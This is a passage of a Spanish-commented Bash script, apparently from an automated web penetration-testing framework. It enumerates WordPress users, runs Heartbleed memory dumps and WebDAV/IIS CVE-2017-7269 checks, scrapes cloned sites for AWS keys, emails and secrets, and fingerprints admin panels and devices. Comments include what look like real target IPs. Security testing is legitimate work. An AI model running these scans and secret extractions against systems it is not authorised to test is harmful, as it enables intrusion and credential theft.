					username="${username//-/.}" # reemplazar - con .
					username="$username@$DOMINIO"
					username="${username//www./}"
					if [ "$VERBOSE" == '1' ]; then echo "probando si $username es valido"; fi
					validate-wordpress-user -url $proto_http://$host:$port/ -username "$username" > logs/enumeracion/"$username"_valid2.txt
					egrep -qi "no existe" logs/enumeracion/"$username"_valid2.txt 2>/dev/null
					greprc=$?
				fi

				if [[ $greprc -eq 1  ]] ; then #"no existe" no presente en log
					echo $username >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt
				fi
			done #wp user
			############
		fi


		if [ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_heartbleedRAM.txt" ]; then
			#heartbleed
			egrep -qi "VULNERABLE" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_heartbleed.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -e "\t\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
				grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_heartbleed.txt
				$proxychains heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_heartbleedRAM.txt
				$proxychains heartbleed.sh $host $port &
			fi
		fi

		if [ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_redirectContent.txt" ]; then
			#Redirect con contenido
			egrep -qi "posiblemente vulnerable" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_httpmethods.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0  ]];then
				if [ "$VERBOSE" == '1' ]; then  echo "Redireccion con contenido DETECTADO $proto_http://$host:$port "; fi
				curl --max-time 10 -k $proto_http://$host:$port > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_redirectContent.txt &
			fi
		fi

		if [ ! -e "logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IIS~CVE~2017~7269.txt" ]; then
			#WebDAV
			egrep -i "OK" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_httpmethods.txt 2>/dev/null| grep -iq 'PROPFIND'
			greprc=$?
			if [[ $greprc -eq 0  ]];then
				if [[ $VERBOSE -eq 's'  ]];then echo "Metodo PROPFIND DETECTADO"; fi
				if [[ "$port" != "80" && "$port" != '443' ]];then
					davtest -url $proto_http://$host:$port >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webdav.txt &
				else
					davtest -url $proto_http://$host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webdav.txt &
				fi
				#exploit cadaver

				grep -i IIS logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"  # no redirecciona
				greprc=$?
				if [[ $greprc -eq 0  ]];then
					explodingcan-checker.py -t $proto_http://$host:$port> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IIS~CVE~2017~7269.txt &
				fi
				# https://www.exploit-db.com/exploits/41992/
			fi
		fi
		done #for hosts
	done # for web.txt
	########

	if [ "$MODE" == "total" ] && [ ! -z $DOMINIO ]; then
		echo -e "[+] Extraer metadatos de sitios clonados (DOMINIO= $DOMINIO)"
		exiftool archivos/$DOMINIO/ > logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null
		egrep -i "Author|creator|modified" logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt | cut -d ":" -f2 | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null

		##### Reporte metadatos (sitio web) ##
		# sed 's/ /-/g' -i .enumeracion/"$DOMINIO"_metadata_exiftool.txt # cambiar espacios por "-"
		# echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
		# for nombretotal in `more .enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null`; do
		# #echo "nombretotal $nombretotal"
		# 	if [[ ${nombretotal} == *"-"*  ]];then
		# 		nombre=`echo $nombretotal | cut -f1 -d "-"`
		# 		apellido=`echo $nombretotal | cut -f2 -d "-"`
		# 		echo "$nombre;$apellido;$apellido@$DOMINIO;n/a" > reportes/correos_metadata.csv
		# 	fi
		# done
		################

		#  Eliminar URLs repetidas (clonacion)
		echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"
		sort logs/enumeracion/"$DOMINIO"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMINIO"_web_wgetURLs.txt


		# filtrar error de conexion a base de datos y otros errores
		egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webTrack/$DOMINIO/* 2>/dev/null| sed 's/webTrack\///g' >> .enumeracion/"$DOMINIO"_web_errores.txt

		# correos presentes en los sitios web
		grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webTrack/$DOMINIO/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" | grep $DOMINIO |  sort |uniq  >> logs/enumeracion/"$DOMINIO"_web_correos.txt
		cat  logs/enumeracion/"$DOMINIO"_correos_recon.txt .enumeracion2/*_correos_recon.txt 2>/dev/null | grep "$DOMINIO" | sed 's/x22//' |  sed 's/x2//' |  sort |uniq  > .enumeracion/"$DOMINIO"_consolidado_correos.txt

		egrep -ira --color=never "aws_access_key_id|aws_secret_access_key" webTrack/$DOMINIO/* > .vulnerabilidades/"$DOMINIO"_aws_secrets.txt

		echo -e "[+] Buscar datos sensible en archivos clonados"
		#echo "cd webTrack/$DOMINIO"
		cd webClone/$DOMINIO
			### replace "space" for "-"
			for dir in *; do
				new_name=$(echo "$dir" | sed 's/ /-/g' | sed 'y/óÓ/oO/' | sed 'y/éÉ/eE/' | sed 'y/áÁ/aA/')
				mv "$dir" "$new_name" 2>/dev/null
			done
			##############

			rm -rf .git 2>/dev/null
			git init >/dev/null 2>/dev/null
			git add . >/dev/null 2>/dev/null
			git commit -m "test" >/dev/null 2>/dev/null

			# generic token - truffle
			docker run --rm -v "$(pwd):/project" truffle-hog  --rules /etc/truffle-rules.json  --exclude_paths  /etc/truffle-exclude.txt --regex --json file:///project  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog.txt
			sed -i "s/'/\"/g" ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog.txt # ' --> "

			cat ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog.txt | jq '.[] | "\(.File), \(.["Strings found"])"' | egrep -v 'a1b2c3|ABCDEFG|dddd'  | sort |uniq > ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog2.txt
			sed -i 's/, /,/g' ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog2.txt # espacios
			sed -i 's/ /\\ /g' ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog2.txt # espacios
			while IFS= read -r line; do
				#echo  $line
				path_file=`echo $line | cut -d ',' -f1 | tr -d '"'| sed 's/ /\\ /g'`
				if [[ (  ${path_file} != *"cookies"* && ${path_file} != *"cookies"* ) ]];then
					keyword=`echo $line | cut -d ',' -f2 | tr -d '" '`
					echo "apikey $keyword"
					apikey=`grep -o  ".\{21\}$keyword.\{1\}" $path_file|sort|uniq | head -1`
					if [[ (  ${apikey} != *"sha256"* && ${apikey} != *"sha512"*  && ${apikey} != *"recaptcha"*) ]];then
						echo "$apikey:$path_file" >> ../../.vulnerabilidades/"$DOMINIO"_web_apiKey.txt
					fi
				fi
			done < ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog2.txt

			# AWS Secret Access Key
			# echo -e "\nAWS Secret Access Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt
			# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 40 --max-key 40 --entropy 4.3   | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt

			# # Azure Shared Key
			# echo -e "\nAzure Shared Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt
			# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 66 --max-key 66 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt

			# # RSA private key
			# echo -e "\n RSA private key " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt
			# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 76 --max-key 76 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt

			# # passwords
			# echo -e "\n passwords " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt
			# docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-pass 9 --max-pass 15 --pass-complex 8  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt


			# # generic token - dumpster-diver
			# echo -e "\n generic token (dumpster-diver)" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt
			# docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-key 25 --max-key 40 --entropy 4.6  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt
		cd ../../
		#grep "found" logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt > .vulnerabilidades/"$DOMINIO"_web_secrets.txt
		#grep "found" logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt >> .vulnerabilidades/"$DOMINIO"_web_secrets.txt
		###################
	fi

	####Parse 2
	grep SUCCEED logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webdav.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webdav.txt 2>/dev/null
	grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IIS~CVE~2017~7269.txt  2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IIS~CVE~2017~7269.txt
	######

	##### Identificar paneles administrativos #####
	echo " ##### Identificar paneles administrativos ##### "
	touch .enumeracion/canary_webData.txt # para que grep no falle cuando solo hay un archivo

	egrep -ira "initium|microapp|inicia|Registro|Entrar|Cuentas|Nextcloud|User Portal|keycloak|kiosko|login|Quasar App|controlpanel|cpanel|whm|webmail|phpmyadmin|Web Management|Office|intranet|InicioSesion|S.R.L.|SRL|Outlook|Zimbra Web Client|Sign In|PLATAFORMA|administrador|Iniciar sesion|Sistema|Usuarios|Grafana|Ingrese|Express|Ingreso de Usuario" logs/enumeracion/*_webDataInfo.txt 2>/dev/null| egrep -vi "Fortinet|Cisco|RouterOS|Juniper|TOTVS|xxxxxx|Mini web server|SonicWALL|Check Point|sameHOST|OpenPhpMyAdmin|hikvision|Error1" | cut -d '~' -f5 | delete-duplicate-urls.py | sort > servicios/web-admin-temp.txt
	comm -23 servicios/web-admin-temp.txt servicios_archived/admin-web-url-inserted.txt  >> servicios/admin-web-url.txt 2>/dev/null #eliminar elementos repetidos

fi #sitio escaneado




######### find services ###
cd .enumeracion/
	touch canary.txt # es necesario que exista al menos 2 archivos
	echo '' > canary_cert.txt

	grep --color=never -i "Dahua" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'   >> ../servicios/dahua-web.txt
	grep --color=never -i "Dell iDRAC" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/idrac.txt
	grep --color=never -i "WebLogic Server" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/WebLogic.txt
	grep --color=never -i "Grafana" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/Grafana.txt
	grep --color=never -i "Fortinet" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/fortinet.txt
	grep --color=never -i "hikvision" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/hikvision.txt
	grep --color=never -i "optical network terminal" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/HUAWEI-AR.txt

	grep --color=never -i "ONT-4G" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  > ../servicios/ZTE-ONT-4G.txt
	grep --color=never -i "ONT1GE3FE2P1TVSWZ" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/ZTE-ONT-4G.txt
	grep --color=never -i "ZTE corp " *webData.txt 2>/dev/null | grep 'F6' | grep 'ZTE-2017' | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  > ../servicios/ZTE-F6XX-2017.txt
	grep --color=never -i "ZTE corp " *webData.txt 2>/dev/null | grep 'F6' | grep 'ZTE-2018' | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  > ../servicios/ZTE-F6XX-2018.txt

	grep --color=never -i ciscoASA *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/ciscoASA.txt
	grep --color=never -i "Cisco Router" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/ciscoRouter.txt

	#phpmyadmin, etc
	#responde con 401
	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i | uniq | tr -d '-'  >> ../servicios/web401.txt

	#responde con 200 OK
	cat *_webadmin.txt 2>/dev/null | grep 200 | awk '{print $2}' | sort | uniq -i | uniq | delete-duplicate-urls.py >> ../servicios/admin-web-url.txt

	#tomcat
	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google|ajp13Info" | awk '{print $2}' | sort | uniq -i | uniq | delete-duplicate-urls.py >> ../servicios/admin-web-url.txt
	#

	#Fortigate
	grep --color=never -i "fortigate" *_cert.txt 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google" | cut -d "_" -f1-2 | tr '_' ':' | tr -d '-' | uniq >> ../servicios/fortigate.txt

	#3com
	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/3com2.txt
	sort ../servicios/3com2.txt | uniq > ../servicios/3com.txt
	rm ../servicios/3com2.txt

	#d-link
	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/d-link2.txt
	sort ../servicios/d-link2.txt | uniq > ../servicios/d-link.txt
	rm ../servicios/d-link2.txt

	#linksys
	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/linksys2.txt
	sort ../servicios/linksys2.txt | uniq > ../servicios/linksys.txt
	rm ../servicios/linksys2.txt

	#Pentahoo
	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/pentaho.txt

	#Dahua Camera
	grep --color=never -i "Dahua Camera" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/dahua_camara.txt

	#ubiquiti
	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ubiquiti2.txt
	sort ../servicios/ubiquiti2.txt | uniq > ../servicios/ubiquiti.txt ; rm ../servicios/ubiquiti2.txt

	#pfsense
	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/pfsense.txt

	#PRTG
	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/PRTG.txt

	#ZKsoftware
	grep --color=never -i 'ZK ' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZKSoftware.txt

	#HIKVISION
	grep --color=never -i 'doc/page/login.asp' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/hikvision.txt

	#vCenter
	grep --color=never -i "ID_VC_Welcome" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/vCenter.txt

	#Cisco
	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" |  cut -d "_" -f1 | uniq >> ../servicios/cisco.txt

	#zimbra
	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/zimbra.txt

	#jboss
	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/jboss.txt

	#F5
	grep --color=never -i 'F5 Networks' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/f5.txt

	#401
		#line = http://200.87.193.109:80/phpmyadmin/
	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "_" -f1 > ../servicios/web401-2.txt
		#line=10.0.0.2:443
	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1-2 | uniq | tr "_" ":"   > ../servicios/web401-2.txt
	# sort
	sort ../servicios/web401-2.txt 2>/dev/null | uniq | uniq  | tr -d '-' >> ../servicios/web401.txt
	rm ../servicios/web401-2.txt 2>/dev/null

cd ..
################################


# revisar si hay scripts ejecutandose
waitFinish
insert_data

if [[ $webScaneado -eq 1 ]]; then
	##########  filtrar los directorios de segundo nivel que respondieron 200 OK (llevarlos a .enumeracion) ################
	# touch logs/enumeracion/canary_webdirectorios2.txt # se necesita al menos 2 archivos *_webdirectorios2.txt
	# echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web (directorios de segundo nivel)"
	# egrep --color=never "^200" logs/enumeracion/*webdirectorios2.txt 2>/dev/null| while read -r line ; do
	# 	#line = 200	http://sigec.ruralytierras.gob.bo:80/login/index/
	# 	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"
	# 	archivo_origen=`echo $line | cut -d ':' -f1`
	# 	contenido=`echo $line | cut -d ':' -f2-6`
	# 	#echo "archivo_origen $archivo_origen"
	# 	archivo_destino=$archivo_origen
	# 	archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}
	# 	#200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
	# 	#echo "contenido $contenido"
	# 	echo $contenido >> $archivo_destino
	# done
	#insert_data


	############ vulnerabilidades relacionados a servidores/aplicaciones web ########
	echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web"
	#Vulnerabilidades detectada en la raiz del servidor
	echo "canary" > .enumeracion2/canary_webData.txt
	#egrep "vulnerabilidad=" .enumeracion2/* 2>/dev/null| while read -r line ; do
	find .enumeracion2 .vulnerabilidades2 -type f 2>/dev/null | xargs egrep "vulnerabilidad=" 2>/dev/null | while read -r line ; do 

		echo -e  "$OKRED[!] Vulnerabilidad detectada $RESET"
		#line=".enumeracion2/170.239.123.50_80_webData.txt:Control de Usuarios ~ Apache/2.4.12 (Win32) OpenSSL/1.0.1l PHP/5.6.8~200 OK~~http://170.239.123.50/login/~|301 Moved~ PHP/5.6.8~vulnerabilidad=MensajeError~^"
		archivo_origen=`echo $line | cut -d ':' -f1` #.enumeracion2/170.239.123.50_80_webData.txt
		if [[ ${archivo_origen} == *"webdirectorios.txt"* || ${archivo_origen} == *"custom.txt"* || ${archivo_origen} == *"webadmin.txt"* || ${archivo_origen} == *"divulgacionInformacion.txt"* || ${archivo_origen} == *"archivosPeligrosos.txt"* || ${archivo_origen} == *"webarchivos.txt"* || ${archivo_origen} == *"webserver.txt"* || ${archivo_origen} == *"archivosDefecto.txt"* || ${archivo_origen} == *"api.txt"* || ${archivo_origen} == *"backupweb.txt"* || ${archivo_origen} == *"webshell.txt"*  || ${archivo_origen} == *"phpinfo.txt"*  ]]; then
			url_vulnerabilidad=`echo "$line" | grep -o 'http[s]\?://[^ ]*'` # extraer url
		else
			# Vulnerabilidad detectada en la raiz
			url_vulnerabilidad=`echo $archivo_origen | cut -d "/" -f 2 | cut -d "_" -f1-2 | tr "_" ":" | tr -d '-'`  #192.168.0.36:8080
			if [[ ${url_vulnerabilidad} == *"443"* || ${url_vulnerabilidad} == *"9091"*  ]]; then
				url_vulnerabilidad="https://$url_vulnerabilidad" #http://192.168.0.36:8080
			else
				url_vulnerabilidad="http://$url_vulnerabilidad"
			fi
		fi


		vulnerabilidad=`echo "$line" | grep -o 'vulnerabilidad=[^ )~]*' | sed 's/vulnerabilidad=//'` #OpenPhpMyAdmin,MensajeError,etc
		echo "vulnerabilidad $vulnerabilidad url_vulnerabilidad $url_vulnerabilidad"
		archivo_destino=$archivo_origen
		archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}
		archivo_destino=${archivo_destino/.vulnerabilidades2/.vulnerabilidades}

		archivo_destino=${archivo_destino/webdirectorios/$vulnerabilidad}
		archivo_destino=${archivo_destino/webarchivos/$vulnerabilidad}
		archivo_destino=${archivo_destino/admin/$vulnerabilidad}
		archivo_destino=${archivo_destino/webData/$vulnerabilidad}
		archivo_destino=${archivo_destino/custom/$vulnerabilidad}


		if [ $vulnerabilidad == 'backdoor' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] backdoor en $url_vulnerabilidad"  ; fi
			contenido=$url_vulnerabilidad
		fi

		if [ $vulnerabilidad == 'PasswordDetected' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] PasswordDetected en $url_vulnerabilidad"  ; fi
			contenido=`getExtract -url $url_vulnerabilidad -type password`
		fi

		if [ $vulnerabilidad == 'ListadoDirectorios' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] ListadoDirectorios en $url_vulnerabilidad"  ; fi
			contenido=`listDir -url=$url_vulnerabilidad | sed '/colspan="5"/d; s/<th valign="top"><img src="\/icons\/blank.gif" alt="\[ICO\]"><\/th>//g; s/<td valign="top"><img src="\/icons\/folder.gif" alt="\[DIR\]"><\/td>//g' | html2texto.py`
		fi

		if [ $vulnerabilidad == 'contenidoPrueba' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] contenidoPrueba"  ; fi
			contenido=$url_vulnerabilidad
		fi


		if [[ ${url_vulnerabilidad} == *"error"* || ${url_vulnerabilidad} == *"log"* || ${url_vulnerabilidad} == *"dwsync"*  ]];then
			echo -e  "$OKRED[!] Archivo de error o log detectado! ($url_vulnerabilidad) $RESET"
			contenido==$url_vulnerabilidad
		fi

		if [[ $vulnerabilidad == 'OpenPhpMyAdmin' || $vulnerabilidad == 'debugHabilitado' || $vulnerabilidad == 'OpenMikrotik' || $vulnerabilidad == 'divulgacionInformacion' ]];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
			contenido=$url_vulnerabilidad
		fi


		if [ $vulnerabilidad == 'MensajeError' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] MensajeError \n"  ; fi
			contenido="$url_vulnerabilidad" 
			#`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
		fi

		if [ $vulnerabilidad == 'IPinterna' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] IPinterna \n"  ; fi
			contenido=`getExtract -url $url_vulnerabilidad -type IPinterna`
		fi


		if [[ $vulnerabilidad == 'phpinfo' ]];then
			if [ "$VERBOSE" == '1' ]; then echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)"   ; fi
			echo "archivo_origen $archivo_origen"
			#.vulnerabilidades2/170.239.123.50_80_webData.txt
			# archivo_origen .vulnerabilidades2/200.87.130.42_443-_phpinfo.txt
			archivo_phpinfo=`echo "$archivo_origen" | sed 's/phpinfo/phpinfo2/'|sed 's/.vulnerabilidades2\///'`
			#archivo_phpinfo = 127.0.0.1_80_phpinfo.txt.
			echo "archivo_phpinfo: logs/vulnerabilidades/$archivo_phpinfo"
			get-info-php "$url_vulnerabilidad" >> logs/vulnerabilidades/$archivo_phpinfo 2>/dev/null
			egrep -iq "USERNAME|COMPUTERNAME|ADDR|HOST" logs/vulnerabilidades/$archivo_phpinfo
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
				contenido=""
				# Añadir URL a la variable contenido
				contenido+="URL $url_vulnerabilidad\n\n"
				# Añadir el resultado del grep a la variable contenido
				contenido+=$(grep ':' logs/vulnerabilidades/$archivo_phpinfo)
				contenido+="\n\n"
			else
				echo -e "[i] No es un archivo phpinfo valido"
			fi	#archivo phpinfo
		fi

		echo "archivo_destino $archivo_destino"
		echo -e $contenido >> $archivo_destino
	done
	# insertar datos
	insert_data
	#################################
fi #webScanned

if [[ -f servicios/admin-web-url.txt ]] ; then # si existe paneles administrativos y no se esta escaneado un sitio en especifico
	#https://sucre.bo/mysql/
	echo -e "$OKBLUE [i] Identificando paneles de administracion $RESET"
	while IFS= read -r url
	do
		
		if ! grep -qF "$url" servicios/admin-web-fingerprint-inserted.txt 2>/dev/null && ! grep -qF "$url" servicios_archived/admin-web-fingerprint-inserted.txt 2>/dev/null; then
			echo -e "\n\t########### ($url)  #######"
			####### Identificar tipo de panel de admin
			host_port=`echo $url | cut -d "/" -f 3` # 190.129.69.107:80
			proto_http=`echo $url | cut -d ":" -f 1`
			if [[ ${host_port} == *":"* ]]; then
				port=`echo $host_port | cut -d ":" -f 2`
			else
				if [[  ${proto_http} == *"https"* ]]; then
					port="443"
				else
					port="80"
				fi
			fi
			host=`echo $host_port | cut -d ":" -f 1`
			path_web2=`echo $url | cut -d "/" -f 4-5`

			echo -e "\t[+] Identificando "
